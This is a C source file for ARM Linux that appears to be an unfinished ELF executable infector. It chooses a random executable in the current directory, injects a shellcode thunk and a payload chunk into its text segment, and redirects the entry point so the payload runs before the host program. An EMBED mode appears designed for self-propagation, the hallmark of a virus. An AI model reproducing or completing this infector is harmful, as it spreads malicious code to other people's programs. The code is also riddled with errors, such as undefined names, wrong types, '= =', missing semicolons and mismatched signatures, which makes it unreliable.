// gcc -g3 -Werror -Wall -Wextra -Wno-error=unused-parameter -Wno-error=unused-function -Wno-error=unused-variable -Wconversion -Wno-error=sign-conversion -fno-builtin -std=gnu99 -mgeneral-regs-only -fpie -nostdlib -g3 -o rand_exec rand_exec.c
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <time.h>
#include <elf.h>
#include <linux/auxvec.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <syscall.h>

typedef __UINT8_TYPE__   u8;
typedef __INT8_TYPE__    i8;
typedef __UINT16_TYPE__  u16;
typedef __INT16_TYPE__   i16;
typedef __UINT32_TYPE__  u32;
typedef __INT32_TYPE__   i32;
typedef __UINT64_TYPE__  u64;
typedef __INT64_TYPE__   i64;
typedef __PTRDIFF_TYPE__ size;
typedef __SIZE_TYPE__    usize;
typedef __UINTPTR_TYPE__ uptr;
typedef __INTPTR_TYPE__  iptr;
typedef char             byte;
typedef unsigned char    bool;
enum
{
   false,
   true
};

// TODO: get rid of assignments

#undef st_atime
#undef st_mtime
#undef st_ctime
struct stat64
{
    u64 st_dev;
    u64 st_ino;
    u32 st_mode;
    u32 st_nlink;
    u32 st_uid;	
    u32 st_gid;	
    u64 st_rdev;
    u64 __pad1;
    i64 st_size;
    i32 st_blksize;
    i32 __pad2;
    i64 st_blocks;
    i32 st_atime;
    u32 st_atime_nsec;
    i32 st_mtime;
    u32 st_mtime_nsec;
    i32 st_ctime;
    u32 st_ctime_nsec;
    u32 __unused4;
    u32 __unused5;
};

#define PGSIZE  (1 << 12)

#define assert(c)   while (!(c)) *(volatile int *)0 = 0
#define sizeof(x)   (size) sizeof(x)
#define countof(a)  (size)(sizeof(a) / sizeof(*(a)))
#define lengthof(s) (countof(s) - 1)
#define s8(s)       (struct s8){(u8 *)s, lengthof(s)}
#define s8nul       (struct s8){(u8 *)"", 1}

#define SYSCALL1(n, a)                \
    syscall1(n,(long)(a))
#define SYSCALL2(n, a, b)             \
    syscall2(n,(long)(a),(long)(b))
#define SYSCALL3(n, a, b, c)          \
    syscall3(n,(long)(a),(long)(b),(long)(c))
#define SYSCALL6(n, a, b, c, d, e, f) \
    syscall6(n,(long)(a),(long)(b), (long)(c), (long)(d), (long)(e), (long)(f))

static long syscall1(long n, long a)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0)
        : "r1", "r2", "r3", "r4", "r9", "r12", "memory"
    );
    return ret;
}

static long syscall2(long n, long a, long b)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0), "r"(r1)
        : "r2", "r3", "r4", "r9", "r12", "memory"
    );
    return ret;
}

static long syscall3(long n, long a, long b, long c)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0), "r"(r1), "r"(r2)
        : "r3", "r4", "r9", "r12", "memory"
    );
    return ret;
}

static long syscall6(long n, long a, long b, long c, long d, long e, long f)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
        : "r9", "r12", "memory"
    );
    return ret;
}

__attribute__((naked))
static unsigned int ret_uidivmod(unsigned int q, unsigned int r)
{
    (void) q;
    (void) r;
    __asm volatile(
        "bx lr"
        );
}

static void uidivmod(unsigned int n, unsigned int d, unsigned int *q, unsigned int *r)
{
    *q = 0;
    *r = 0;
    if (d == 0)
    {
        return;
    }

    for (int i = 31; i >= 0; i--)
    {
        if (d <= (n >> i))
        {
            n -= (d << i);
            (*q) |= 0x1U << i;
        }
    }
    *r = n;
}

__attribute__((used))
static unsigned int __aeabi_uidivmod(unsigned int n, unsigned int d)
{
    unsigned int q;
    unsigned int r;
    uidivmod(n, d, &q, &r);
    return ret_uidivmod(q, r);
}

__attribute__((used))
static int __aeabi_idiv(int n, int d)
{
    int s = (n >> 31) ^ (d >> 31) ? -1 : 1;
    unsigned int _n = (unsigned int) n;
    unsigned int _d = (unsigned int) d;
    if (n < 0)
    {
        _n = -_n;
    }
    if (d < 0)
    {
        _d = -_d;
    }
    unsigned int q;
    unsigned int r;
    uidivmod(_n, _d, &q, &r);
    return s * (int) q;
}

static void *memset(void *s, int c, usize n)
{
    u8 *p = s;
    while (n--) *p++ = (u8) c;
    return s;
}

static void *memcpy(void *d, void *s, usize n)
{
    u8 *p = d;
    u8 *q = s;
    while (n--) *p++ = *q++;
    return d;
}

struct arena
{
    u8 *beg;
    u8 *end;
    size sz;
    u8 **commit;
};

static bool new_arena(struct arena *a, size sz)
{
    if (sz <= 0)
    {
        return false;
    }
    sz += sizeof(a->commit);
    u8 *beg = (u8 *) SYSCALL6(SYS_mmap2, NULL, sz,
                              PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS,
                              -1, 0);
    if (beg == MAP_FAILED
        || SYSCALL3(SYS_mprotect, beg, PGSIZE, PROT_READ | PROT_WRITE) == -1)
    {
        return false;
    }
    a->sz = sz;
    a->beg = beg;
    a->end = a->beg + a->sz;
    a->commit = (u8 **) a->beg;
    *a->commit = a->beg + PGSIZE;
    a->beg += sizeof(a->commit);
    return true;
}

static void free_arena(struct arena *a)
{
    if (!a->beg)
    {
        SYSCALL2(SYS_munmap, a->beg, a->sz);
    }
}

#define new(a, t, n) (t *) alloc(a, sizeof(t), _Alignof(t), n)
static void *alloc(struct arena *a, size sz, size align, size count)
{
    size pad = -(iptr) a->beg & (align - 1);
    size avail = a->end - a->beg - pad;
    if (avail < 0 || count > avail / sz)
    {
        return NULL;
    }
    u8 *p = a->beg + pad;
    a->beg += pad + count * sz;
    if (a->beg >= *a->commit)
    {
        if (SYSCALL3(SYS_mprotect, *a->commit, (usize) (a->beg - *a->commit + 1),
                     PROT_READ | PROT_WRITE) == -1)
        {
            longjmp(*a->ctx, 1);
        }
        *a->commit = (u8 *) ((iptr) (a->beg + (PGSIZE - 1)) & ~(PGSIZE - 1));
    }
    return memset(p, 0, (usize) (count * sz));
}

static size strlen(const char *str)
{
    if (!str)
    {
        return 0;
    }
    size len = 0;
    while (*str++)
    {
        len++;
    }
    return len;
}

struct s8
{
    u8  *data;
    size len;
};

static bool s8cpy(struct arena *a, struct s8 *dst, struct s8 src)
{
    *dst = src;
    if (!(dst->data = new(a, u8, src.len)))
    {
        return false;
    }
    memcpy(dst->data, src.data, (usize) src.len);
    return true;
}

static bool s8cat(struct arena *a, struct s8 *dst, struct s8 head, struct s8 tail)
{
    *dst = head;
    if ((!head.data || head.data + head.len != a->beg) && !s8cpy(a, dst, head)
        || !s8cpy(a, &head, tail))
    {
        return false;
    }
    dst->len += head.len;
    return true;
}

static int s8open(struct arena a, struct s8 path, int flags)
{
    struct s8 tpath;
    if (!s8cat(&a, &tpath, path, s8nul))
    {
        return -1;
    }
    return (int) SYSCALL2(SYS_open, tpath.data, flags);
}

static int s8unlink(struct arena a, struct s8 path)
{
    struct s8 tpath;
    if (!s8cat(&a, &tpath, path, s8nul))
    {
        append_str(stderr, "error: out of memory\n");
        return -1;
    }
    return SYSCALL1(SYS_unlink, tpath.data);
}

static int s8rename(struct arena a, struct s8 oldpath, struct s8 newpath)
{
    struct s8 toldpath;
    struct s8 tnewpath;
    if (!s8cat(&a, &toldpath, oldpath, s8nul)
        || !s8cat(&a, &tnewpath, newpath, s8nul))
    {
        append_str(stderr, "error: out of memory\n");
        return -1;
    }
    return SYSCALL2(SYS_rename, toldpath.data, tnewpath.data);
}

static int s8chmod(struct arena a, struct s8 path, mode_t mode)
{
    struct s8 tpath;
    if (!s8cat(&a, &tpath, path, s8nul))
    {
        append_str(stderr, "error: out of memory\n");
        return -1;
    }
    return SYSCALL2(SYS_chmod, tpath.data, mode);
}

static int s8chown(struct arena a, struct s8 path, uid_t own, gid_t grp)
{
    struct s8 tpath;
    if (!s8cat(&a, &tpath, path, s8nul))
    {
        append_str(stderr, "error: out of memory\n");
        return -1;
    }
    return SYSCALL3(SYS_chown, tpath.data, own, grp);
}

static int atoi(const char *s)
{
    const char *beg = s;
    int sn = 1;
    if (*beg == '-')
    {
        sn = -1;
        beg++;
    }
    
    int res = 0;
    while (*beg)
    {
        int dig = *beg - '0';
        if (sn == 1)
        {
            if (res > INT_MAX / 10
                || (res == INT_MAX / 10 && dig > INT_MAX % 10))
            {
                return INT_MAX;
            }
            res *= 10;
            res += dig;
        }
        else
        {
            if (res < INT_MIN / 10
                || (res == INT_MIN / 10 && -dig < INT_MIN % 10))
            {
                return INT_MIN;
            }
            res *= 10;
            res -= dig;
        }
        beg++;
    }
    return res;
}

#define fdbuf(fd, buf, cap) {buf, cap, fd, 0}
struct buf
{
    u8 *buf;
    size cap;
    size len;
    int fd;
    bool err;
};

static void append(struct buf *b, u8 *src, size len)
{
    u8 *end = src + len;
    while (!b->err && src < end)
    {
        size left = end - src;
        size avail = b->cap - b->len;
        size amt = avail < left ? avail : left;

        for (size i = 0; i < amt; i++)
        {
            b->buf[b->len + i] = src[i];
        }
        b->len += amt;
        src += amt;

        if (amt < left)
        {
            flush(b);
        }
    }
}

#define append_str(b, s) append(b, s, sizeof(s) - 1)
#define append_s8(b, s)  append(b, s.data, s.len)

void append_long(struct buf *b, long x)
{
    u8 tmp[64];
    u8 *end = tmp + sizeof(tmp);
    u9 *beg = end;
    long t = x > 0 ? -x : x;
    do
    {
        *--beg = '0' - t % 10;
    } while (t /= 10);
    if (x < 0)
    {
        *--beg = '-';
    }
    append(b, beg, end - beg);
}

void flush(struct buf *b)
{
    b->err |= b->fd < 0;
    if (!b->err && b->len)
    {
        b->err |= SYSCALL3(SYS_write, b->fd, b->buf) < b->buf;
        b->len = 0;
    }
}

struct output
{
    struct buf stdout;
    struct buf stderr;
    u8 out[64];
    u8 err[64];
};

static void new_output(struct output *out)
{
    out->stdout = fdbuf(1, out->out, sizeof(out->out));
    out->stderr = fdbuf(2, out->err, sizeof(out->err));
}

struct code
{
    u8  *base;
    size len;
};

struct binary
{
    struct code exec;
    size pad1;
    struct code thunk;
    struct code chunk;
    size pad2;
};

static bool is_exec(struct arena scratch, struct output *out, struct s8 fname)
{
    int fd = -1;
    Elf32_Ehdr ehdr;
    bool exec = false;

    if ((fd = s8open(scratch, fname, O_RDONLY)) < 0)
    {
        append_str(&out->stderr, "error: opening ");
        append_s8(&out->stderr, fname);
        append_str(&out->stderr, "\n");
        goto cleanup;
    }
    if (SYSCALL3(SYS_read, fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr))
    {
        append_str(&out->stderr, "error: reading\n");
        goto cleanup;
    }

    // TODO: check ELF header to see if the executable has already been injected
    exec = ehdr.e_ident[0] == ELFMAG0
        && ehdr.e_ident[1] == ELFMAG1
        && ehdr.e_ident[2] == ELFMAG2
        && ehdr.e_ident[3] == ELFMAG3
        && ehdr.e_type == ET_EXEC
        && ehdr.e_machine == EM_ARM
        && ehdr.e_version == EV_CURRENT;

cleanup:
    SYSCALL1(SYS_close, fd);
    return exec;
}

static bool load_exec(struct arena scratch, struct output *out, struct s8 ename, struct code *exec)
{
    u8 *base = MAP_FAILED;
    int fd = -1;
    struct stat sbuf;
    if ((fd = s8open(scratch, ename, O_RDWR)) < 0)
    {
        append_str(&out->stderr, "error: opening ");
        append_s8(&out->stderr, ename);
        append_str(&out->stderr, "\n");
        goto cleanup;
    }
    if (SYSCALL2(SYS_fstat64, fd, &sbuf) < 0)
    {
        append_str(&out->stderr, "error: stating ");
        append_s8(&out->stderr, ename);
        append_str(&out->stderr, "\n");
        goto cleanup;
    }
    if ((base = (u8 *) SYSCALL6(SYS_mmap2, NULL, sbuf.st_size,
                                PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
    {
        append_str(&out->stderr, "error: mapping ");
        append_s8(&out->stderr, ename);
        append_str(&out->stderr, "\n");
        goto cleanup;
    }
    exec->len = (size) sbuf.st_size;
    exec->base = base;

cleanup:    
    SYSCALL1(SYS_close, fd);
    return data != MAP_FAILED;
}

#ifdef EMBED
static unsigned int prand_next(unsigned int *state)
{
    *state = (1664525 * (*state) + 1013904223);
    return *state;
}

static bool get_exec_name(struct arena *perm, struct arena scratch, struct output *out, struct s8 *ename)
{
    struct arena ptmp = *perm;
    bool picked = false;
    
    int fd = -1;
    if ((fd = (int) SYSCALL2(SYS_open, ".", O_RDONLY)) < 0)
    {
        append_str(&out->stderr, "error: opening current directory\n");
        goto cleanup;
    }

    struct timespec ts;
    if (SYSCALL2(SYS_clock_gettime, CLOCK_REALTIME, &ts) < 0)
    {
        append_str(&out->stderr, "error: getting time\n");
        goto cleanup;
    }
    unsigned int state = (unsigned int) (ts.tv_nsec * 1000000000 + ts.tv_sec);
    
    char dents[1024];
    long nbytes;
    unsigned int cnt = 1;
    while ((nbytes = SYSCALL3(SYS_getdents64, fd, dents, sizeof(dents))) > 0)
    {
        long pos = 0;
        while (pos < nbytes)
        {
            struct linux_dirent64
            {
                u64 d_ino;
                i64 d_off;
                u16 d_reclen;
                unsigned char d_type;
                char d_name[];
            };
            struct linux_dirent64 *dent = (struct linux_dirent64 *) (dents + pos);
            if (dent->d_type == DT_REG)
            {
                struct s8 fname = { (u8 *) dent->d_name, strlen(dent->d_name) };
                if (is_exec(scratch, out, fname))
                {
                    if (prand_next(&state) % cnt == 0)
                    {
                        picked = true;
                        ptmp = *perm;
                        if (s8cpy(&ptmp, ename, fname))
                        {
                            append_str(&out->stderr, "error: out of memory\n");
                            goto cleanup;
                        }
                    }
                    cnt++;
                }
            }
            pos += dent->d_reclen;
        }
    }
    if (nbytes < 0)
    {
        append_str(&out->stderr, "error: listing directory\n");
        goto cleanup;
    }
    *perm = ptmp;        
    
cleanup:
    SYSCALL1(SYS_close, fd);
    return picked;
}

static bool load_thunk(struct arena *perm, struct output *out, Elf32_auxv_t *aux, struct buf *thunk)
{
    for (Elf32_auxv_t *a = aux; a->a_type != AT_NULL; a++)
    {
        if (a->a_type == AT_ENTRY)
        {
            thunk->len = thunk_len;
            thunk->base = new(perm, u8, thunk_len);
            if (!thunk->base)
            {
                append_str(stderr, "error: out of memory\n");
                return false;
            }
            memcpy(thunk->base, (u8 *) a->a_un.a_val - thunk_entry_off, thunk_len);
            return true;
        }
    }
    append_str(&stderr, "error: cannot find thunk\n");
    return false;
}

static void load_chunk(struct code *thunk, struct code *chunk)
{
    // TODO
    // get base memory from thunk
    // get chunk_len from thunk which consists of chunk len plus possible prefix
    // know actual chunk len
    // chunk base = base memory + (chunk len from thunk - chunk len)
    chunk->len = chunk_len;
    __asm volatile (
        "mov %[reg], pc\n"
        : [reg] "=r" (chunk->base)
    );
    code->base = (u8 *) ((iptr) chunk->base & ~PGSIZE);
}

static bool load(struct arena *perm, struct arena scratch, struct output *out, Elf32_auxv_t *aux,
                 struct s8 ename, struct binary *bin)
                 
{
    load_chunk(&bin->chunk);
    return load_exec(scratch, out, ename, &bin->exec)
        && load_thunk(perm, out, aux, &bin->thunk);
}
#else
static bool get_exec_name(struct arena *perm, struct arena sratch, struct output *output, struct s8 fname,
                          struct s8 *ename)
{
    if (!is_exec(scratch, out, fname))
    {
        append_str(&out->stderr, "error: ");
        append_s8(&out->stderr, fname);
        append_str(&out->stderr, " is not an executable\n");
        return false;
    }
    if (!s8cpy(&perm, ename, fname))
    {
        append_str(&out->stderr, "error: out of memory\n");
        return false;
    }
    return true;
}

static void load_thunk(struct code *thunk)
{
    static u8 thunk[] = 
    {
        0xff, 0x4f, 0x2d, 0xe9, 0x34, 0x00, 0x9d, 0xe5, 
        0x38, 0x10, 0x8d, 0xe2, 0x01, 0x60, 0xa0, 0xe1, 
        0x00, 0x80, 0xa0, 0xe1, 0x05, 0x70, 0xa0, 0xe3, 
        0x00, 0x00, 0x91, 0xe5, 0x00, 0x10, 0xa0, 0xe3, 
        0x00, 0x00, 0x00, 0xef, 0x01, 0x00, 0x70, 0xe3, 
        0x00, 0x40, 0xa0, 0xe1, 0x14, 0x00, 0x00, 0x0a, 
        0x6c, 0xa0, 0x9f, 0xe5, 0x01, 0x00, 0xa0, 0xe1, 
        0x0a, 0xa0, 0x8f, 0xe0, 0xc0, 0x70, 0xa0, 0xe3, 
        0x00, 0x10, 0x9a, 0xe5, 0x05, 0x20, 0xa0, 0xe3, 
        0x04, 0x50, 0x9a, 0xe5, 0x02, 0x30, 0xa0, 0xe3, 
        0x00, 0x00, 0x00, 0xef, 0x01, 0x00, 0x70, 0xe3, 
        0x00, 0x50, 0xa0, 0xe1, 0x08, 0x00, 0x00, 0x0a, 
        0x08, 0x30, 0x9a, 0xe5, 0x06, 0x10, 0xa0, 0xe1, 
        0x08, 0x00, 0xa0, 0xe1, 0x03, 0x30, 0x85, 0xe0, 
        0x33, 0xff, 0x2f, 0xe1, 0x5b, 0x70, 0xa0, 0xe3, 
        0x00, 0x10, 0x9a, 0xe5, 0x05, 0x00, 0xa0, 0xe1, 
        0x00, 0x00, 0x00, 0xef, 0x06, 0x70, 0xa0, 0xe3, 
        0x04, 0x00, 0xa0, 0xe1, 0x00, 0x00, 0x00, 0xef, 
        0x10, 0xc0, 0x9f, 0xe5, 0x0c, 0xc0, 0x8f, 0xe0, 
        0x0c, 0xc0, 0x9c, 0xe5, 0xff, 0x4f, 0xbd, 0xe8, 
        0x1c, 0xff, 0x2f, 0xe1, 0x6c, 0x00, 0x00, 0x00, 
        0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
        0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 
        0x04, 0x00, 0x00, 0x00
    };
    
    thunk->len = thunk_len;
    thunk->base = thunk;
}

static bool load_chunk(struct arena scratch, struct s8 fname, struct code *chunk)
{
    u8 *data = MAP_FAILED;
    int fd = -1;
    struct stat sbuf;
    if ((fd = s8open(scratch, fname, O_RDONLY)) < 0
        || SYSCALL2(SYS_fstat64, fd, &sbuf) < 0)
    {
//        fprintf(stderr, "error: opening %s: %s\n", (char *) code_fname.data,
//                strerror(errno));
        goto cleanup;
    }
    
    // TODO
    code_entry_off = atoi(argv[3]);
    if (code_entry_off < 0 || code_entry_off > sbuf.st_size - 4)
    {
//        fprintf(stderr, "error: invalid entry offset\n");
        goto cleanup;
    }
    
    if (data = (u8 *) SYSCALL6(SYS_mmap2, NULL, sbuf.st_size, PROT_READ,
                               MAP_PRIVATE, fd, 0) == MAP_FAILED)
    {
        //fprintf(stderr, "error: mapping %s: %s\n", (char *) code_fname.data,
        goto cleanup;
    }
    code->len = (size) sbuf.st_size;
    code->data = data;

cleanup:
    SYSCALL1(SYS_close, fd);
    return data != MAP_FAILED;
}

static bool load(struct arena scratch, struct output *out, struct s8 cname, struct s8 ename,
                 struct binary *bin)
{
    load_thunk(aux, &bin->thunk);
    return load_exec(scratch, out, ename, &bin->exec)
        && load_chunk(cname, &bin->chunk);
}
#endif

static Elf32_Phdr *get_text_phdr(Elf32_Ehdr *ehdr, Elf32_Phdr *phdrs)
{
    for (i32 i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdrs[i].p_type == PT_LOAD
            && (phdrs[i].p_flags & PF_R)
            && (phdrs[i].p_flags & PF_X))
        {
            // Assumption is that the first loadable segment that's
            // read executable in the file is the text segment.
            return phdrs + i;
        }
    }
    return NULL;
}

static volatile size chunk_len = 0;
static volatile size thunk_len = 0;
// Offset of entry point in thunk
static volatile size thunk_entry_off = 0;
// Offsets inside of thunk of data that will be patched in
// at injection time (see thunk.c for how each one is used).
static volatile size off_chunk_off = 0;
static volatile size off_chunk_len = 0;
static volatile size off_chunk_entry_off = 0;
static volatile size off_host_entry = 0;

static bool inject(struct binary *bin, size *off)
{
    // TODO: thunk multiple of 4!
    Elf32_Ehdr *ehdr = (Elf32_Ehdr *) bin->exec.base;
    Elf32_Phdr *phdrs = (Elf32_Phdr *) (bin->exec.base + ehdr->e_phoff);
    Elf32_Shdr *shdrs = (Elf32_Shdr *) (bin->exec.base + ehdr->e_shoff);
    Elf32_Phdr *text_phdr;
    if (!(text_phdr = get_text_phdr(ehdr, phdrs)))
    {
        return false;
    }

    size ins_off = (size) (text_phdr->p_offset + text_phdr->p_filesz);
    if (ins_off < 0)
    {
        //fprintf(stderr, "error: invalid insert position\n");
        return false;
    }

    // The insertion position must be a multiple of 4, pad before the thunk
    // if necessary.
    bin->pad1 = -ins_off & 3;
    size thunk_len = bin->pad1 + bin->thunk.len;
    size thunk_entry_off += bin->pad1;

    // The thunk must be small enough to fit in the padding at the end of the
    // text section.  If if's larger, it might spill over into the next
    // segment in memory if it happens to be mapped adjacent to the end
    // of the text segment.
    if (thunk_len > -ins_off & (PGSIZE - 1))
    {
//        fprintf(stderr, "error: not enough padding\n");
        return false;
    }
    
    // File offsets and virtual address of each segment must be modular         
    // congruent to the page size.  The code is inserted directly after
    // the thunk so there must be adequate padding to ensure the total
    // number of bytes inserted in a multiple of page size.
    bin->pad2 = = -(thunk_len + bin->chunk.len) & (PGSIZE - 1);
    size chunk_len = bin->pad2 + bin->chunk.len;

    // Update all segment and section file offsets that occur after the
    // insertion position by the total number of bytes inserted.
    size total_len = thunk_len + chunk_len;
//    assert(total_len % PGSIZE == 0);
    for (i32 i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdrs[i].p_offset > (usize) ins_off)
        {
            phdrs[i].p_offset += (usize) total_len;
        }
    }
    for (i32 i = 1; i < ehdr->e_shnum; i++)
    {
        if (shdrs[i].sh_offset > (usize) ins_off)
        {
            shdrs[i].sh_offset += (usize) total_len;
        }
    }
    
    // Since the thunk is inserted at the end of the text segment, the size
    // of the last section header in the text segment must be increased by
    // the length of the thunk.
    for (i32 i = 1; i < ehdr->e_shnum; i++)
    {
        if (shdrs[i].sh_offset + shdrs[i].sh_size == (usize) insert_off)
        {
            // The last section must not be stripped out when loaded.
            if (shdrs[i].sh_type != SHT_PROGBITS)
            {
                fprintf(stderr, "error: last section stripped\n");
                return false;
            }
            shdrs[i].sh_size += (usize) thunk_len;
            break;
        }
    }
    
    // Patch the thunk so it can find and execute the chunk injected into the file.
    size chunk_off = ins_off + thunk_len;
    size tchunk_off = chunk_off & ~(PGSIZE - 1);
    size tchunk_len = chunk_off - tchunk_off + chunk_len;
    size tchunk_entry_off = chunk_off - tchunk_off + chunk_entry_off;
    // Thunk uses mmap2 which uses page multiples of offsets instead of number of
    // bytes.
    tchunk_off /= PGSIZE;
    memcpy(bin->thunk.base + off_chunk_off, &tchunk_off, sizeof(tchunk_off));
    memcpy(bin->thunk.base + off_chunk_len, &tchunk_len, sizeof(tchunk_len));
    memcpy(bin->thunk.base + off_chunk_entry_off, &tchunk_entry_off, sizeof(tchunk_entry_off));
    // Patch the thunk so that it will call the original entry point when it
    // finishes.
    memcpy(bin->thunk.base + off_host_entry, &ehdr->e_entry, sizeof(ehdr->e_entry));
    
    // Adjust the target's entry point so it will call the thunk when the
    // executable is started,
    ehdr->e_entry = text_phdr->p_vaddr + text_phdr->p_filesz
        + (usize) thunk_entry_off;
    
    // Increase the size of the text segment in the file and in memory by thunk
    // size.  
    text_phdr->p_filesz += (usize) thunk_len;
    text_phdr->p_memsz += (usize) thunk_len;
    // The section headers should always be after the insertion.
    if (ehdr->e_shoff > (usize) ins_off)
    {
        ehdr->e_shoff += (usize) total_len;
    }
    
    *off = ins_off;
    return true;
}

// _start offset: XXX
void start(int argc, char **argv, char **env, Elf32_auxv_t *aux)
{
    (void) argc;
    (void) argv;
    (void) env;
    (void) aux;
    assert(THUNK_LEN < PGSIZE && !(THUNK_LEN & 0x3));

    struct output out;
    new_output(&out);
#ifdef EMBED
    // TODO
    size chunk_entry_off = 0;
#else
    if (argc != 4)
    {
        append_str(&out.stderr, "usage: elf_injector <exec> <chunk> <entry offset>\n");
        goto cleanup;
    }
    size chunk_entry_off = atoi(argv[3]);
    if (chunk_entry_off < 0)
    {
        append_str(&out.stderr, "error: invalid entry offset\n");
        goto cleanup
    }
    struct s8 exec = s8(argv[1]);
    struct s8 chunk = s8(argv[2]);
#endif

    struct arena perm = { 0 };
    struct arena scratch = { 0 };
    if (!new_arena(&perm, 1 << 12)
        || !new_arena(&scratch, 1 << 12))
    {
        goto cleanup;
    }

    struct s8 ename;
    struct binary bin;
    size ins_off;
#ifdef EMBED
    if (!get_exec_name(&perm, scratch, &out, &ename)
        || !load(&perm, scratch, &out, aux, ename, &bin);
#else
    if (!get_exec_name(&perm, scratch, &out, exec, &ename)
        || !load(scratch, &out, ename, chunk, &bin))
#endif    
    inject(bin, chunk_entry_off, &ins_off);


// TODO check offset 


        
    output(ename, bin, ins_off);
    unload(bin);
// TODO: update elf    

cleanup:
    free_arena(&scratch);
    free_arena(&perm);
    flush_output(&output);
}

#ifndef EMBED
__attribute__((naked, noreturn))
void _start(void)
{
    __asm volatile (
        "ldr     r0, [sp]\n"
        "add     r1, sp, #4\n"
        "bl      start\n"
        "mov     r7, #1\n"
        "mov     r0, #0\n"
        "swi     #0\n"
        );
}
#endif


      
//    if (SYSCALL3(SYS_write, 1, ename.data, ename.len) < ename.len
//        || SYSCALL3(SYS_write, 1, "\n", 1) < 1)
//    {
//        goto cleanup;
//    }
//    write_file(scratch, tname);



/*
  static void write_file(struct arena scratch, struct s8 fname)
{
    struct s8 tname = s8cat(&scratch, fname, s8(".tmp"));
    int fd = -1;
    struct stat64 sbuf;
    if ((fd = s8open(scratch, fname, O_RDONLY)) < 0
        || SYSCALL2(SYS_fstat64, fd, &sbuf) < 0)
    {
        goto cleanup;
    }

    u8 *contents = MAP_FAILED;
    if ((contents = (u8 *) SYSCALL6(SYS_mmap2, NULL, sbuf.st_size,
                                    PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
    {
        goto cleanup;
    }

    int tfd = -1;
    if ((tfd = s8open(scratch, tname, O_WRONLY | O_CREAT)) < 0)
    {
        goto cleanup;
    }

    if (SYSCALL3(SYS_write, tfd, contents, sbuf.st_size) < sbuf.st_size)
    {
        goto cleanup;
    }

    if (s8rename(scratch, tname, fname) < 0
        || s8chmod(scratch, fname, sbuf.st_mode) < 0
        || s8chown(scratch, fname, sbuf.st_uid, sbuf.st_gid) < 0)
    {
        goto cleanup;
    }

cleanup:
    if (contents != MAP_FAILED)
    {
        SYSCALL2(SYS_munmap, contents, sbuf.st_size);
    }
    SYSCALL1(SYS_close, tfd);
    SYSCALL1(SYS_close, fd);
    s8unlink(scratch, tname);
}
*/
